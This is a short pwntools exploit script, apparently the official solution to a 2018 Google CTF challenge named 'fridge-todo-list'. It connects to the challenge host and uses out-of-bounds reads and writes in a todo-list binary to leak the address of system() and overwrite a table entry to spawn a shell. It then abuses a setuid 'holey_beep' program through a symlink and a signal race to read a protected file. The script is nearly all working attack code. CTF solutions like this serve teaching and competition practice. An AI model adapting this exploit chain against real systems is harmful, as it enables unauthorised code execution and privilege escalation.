#!/usr/bin/env python2
#Copyright 2018 Google LLC
#
#Licensed under the Apache License, Version 2.0 (the "License");
#you may not use this file except in compliance with the License.
#You may obtain a copy of the License at
#
#    https://www.apache.org/licenses/LICENSE-2.0
#
#Unless required by applicable law or agreed to in writing, software
#distributed under the License is distributed on an "AS IS" BASIS,
#WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#See the License for the specific language governing permissions and
#limitations under the License.

from pwn import *
from time import sleep

context.binary = ELF('./todo')
r = remote('fridge-todo-list.ctfcompetition.com', 1337)

def menu(opt):
  r.sendlineafter('> ', str(opt))

def print_todo(off):
  menu(2)
  r.sendlineafter('Which entry would you like to read?', str(off))
  r.recvuntil('Your TODO: ')
  return r.recvuntil('\n', drop=True)

def store_todo(off, todo):
  menu(3)
  r.sendlineafter('In which slot would you like to store the new entry? ', str(off))
  r.recvuntil('What\'s your TODO? ')
  return r.sendline(todo[:63])

r.sendlineafter('user: ', 'foobar')
system = u64(print_todo(-6).ljust(8, '\x00')) + (0x40-0x16)
info('system at 0x{:x}'.format(system))
store_todo(-4, flat(system)*5)
r.sendline('bash')

sleep(0.5)

r.sendline('''cd /tmp
mkdir dev
ln -s /secret_cake_recipe dev/console
/home/user/holey_beep {1..4096} & pkill holey_beep -SIGTERM''')

r.interactive()
